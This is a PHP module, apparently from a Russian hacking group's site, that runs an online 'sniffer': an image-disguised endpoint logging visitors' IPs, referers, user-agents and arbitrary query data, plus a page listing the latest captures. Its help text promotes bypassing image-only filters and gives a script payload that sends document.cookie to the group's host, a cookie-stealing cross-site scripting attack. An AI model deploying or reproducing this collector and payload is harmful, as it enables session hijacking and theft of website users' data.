<?php

if ( !defined ( "IN_LOCK_TEAM_ENGINE" ) ) {
   print "Access denied!";
   exit ();
}

class GLOBAL_SNIFFER {

      function show_sniffer_info ( ) {

               $result = "
                          <center class=porr>On-Line Сниффер</center><br>
                          <b class=porr>Адрес сниффера : </b><br>
                          <b class=por>http://www.lock-team.com/<b class=porr>имя_файла</b>.jpg?<b class=porr>ваш текст</b></b><br><br>

                          Сниффер позволяет получать IP адрес, полный адрес(URL) странички с которой был принят запрос, и абсолютно любые данные, переданные снифферу в запросе.<br><br>
                          Сниффер возвращает браузеру прозрачную картинку (GIF) с размерами 1x1 px, что позволяет вызывать его как непосредственно по ссылке в теге <b class=date>". htmlspecialchars ( "<a href=\"\"></a>" ) ."</b>, так и в качестве src (source) в теге <b class=date>". htmlspecialchars ( "<img src=\"\">" ) ."</b>.<br><br>
                          Это обстоятельство позволяет использовать сниффер в обход различных фильтров пропускающих только адреса картинок.
                          Передача параметров снифферу осуществляется через строку-URL, расположенную после знака <b class=porr>?</b>. К примеру :<br>
                          <b class=por>http://www.lock-team.com/<b class=porr>имя_файла</b>.jpg?<b class=porr>ваш текст</b></b><br>
                          Где вместо <b class=porr>имени файла</b> могут быть использваны любые латинские (строчные или прописные) буквы , любые цыфры и подчеркивание (_)<br>
                          Именно это позволяет вам обойтись в строке запроса без всяких /cgi-bin/, а написать первое пришедшее в голову имя файла.<br>
                          <br>
                          Примеры использования сниффера : <br>
                          <b class=date>Вызов по простой ссылки :</b><br>
                          <b class=por>". htmlspecialchars ( "<a href=\"http://lock-team.com/my.jpg?privet\">Click here</a>" ) ."</b><br>
                          <b class=date>Вызов как кртинки :</b><br>
                          <b class=por>". htmlspecialchars ( "<img src=\"http://lock-team.com/agent_007.jpg?privet\">" ) ."</b><br>
                          <b class=date>Вызов из скрипта :</b><br>
                          <b class=por>". htmlspecialchars ( "<script>" ) ."<br>". htmlspecialchars ( "img = new Image();" ). "<br>". htmlspecialchars ( "img.src = \"http://lock-team.com/sniffer.jpg?\"+document.cookie;" ) ."<br>". htmlspecialchars ( "</script>" ) ."</b><br><br>
               ";
               
               return $result;
               
      }

      function show_last_logs ( ) {
               global $sql;
               
               $query = "SELECT * FROM `". SQL_TABLE_GLOBAL_SNIFFER ."` ORDER BY `id` DESC LIMIT 25";
               $data = $sql->query ( $query, "print_error_and_exit" );

               $logov = mysql_num_rows ( $data );
               $result = "<center class=porr>Последние записи (<b class=por>". ( $logov < 25 ? $logov : 25 ) ."</b>)</center><br>";
               $result .= "<button class=\"button\" onclick=\"location.reload(true)\" style=\"width : 100%\">Обновить</button><br><br>";

               while ( $log = mysql_fetch_assoc ( $data ) ) :
               
                     $url = parse_url ( urldecode ( base64_decode ( $log["referer"] ) ) );
                     if ( !isset ( $url["host"] ) ) $url["host"] = "unknown";
                     if ( !isset ( $url["scheme"] ) ) $url["scheme"] = "xxxx";
                     $result .= "
                                 <table cellpadding=\"1\" cellspacing=\"0\" border=\"0\" style=\"border : 1px dashed black; width:100%\">
                                 <tr>
                                     <td width=\"110\"><b class=porr>IP - </b><b class=date>". $log["ip_address"] ."</b></td>
                                     <td><b class=porr>Scheme - </b>". $url["scheme"] ."</td>
                                     <td><b class=porr>Site - </b><b class=date>". $url["host"] ."</b></td>
                                     <td width=\"200\"><b class=por>Date - </b><tt class=date>". $log["create_time"] ."</tt></td>
                                 </tr>
                                 <tr>
                                     <td><b class=por>Referer</b></td>
                                     <td colspan=\"3\"><b class=date>". urldecode ( base64_decode ( $log["referer"] ) ) ."</b></td>
                                 </tr>
                                 <tr>
                                     <td><b class=por>User-Agent</b></td>
                                     <td colspan=\"3\"><tt class=date>". $log["user_agent"] ."</tt></td>
                                 </tr>
                                 <tr>
                                     <td><br><b class=porr>Query String</b></td>
                                     <td colspan=\"3\"><br><tt class=date>". urldecode ( base64_decode ( $log["content"] ) ) ."</tt></td>
                                 </tr>
                                 </table><br>
                     ";
               endwhile;

               return $result;
               
      }

}

?>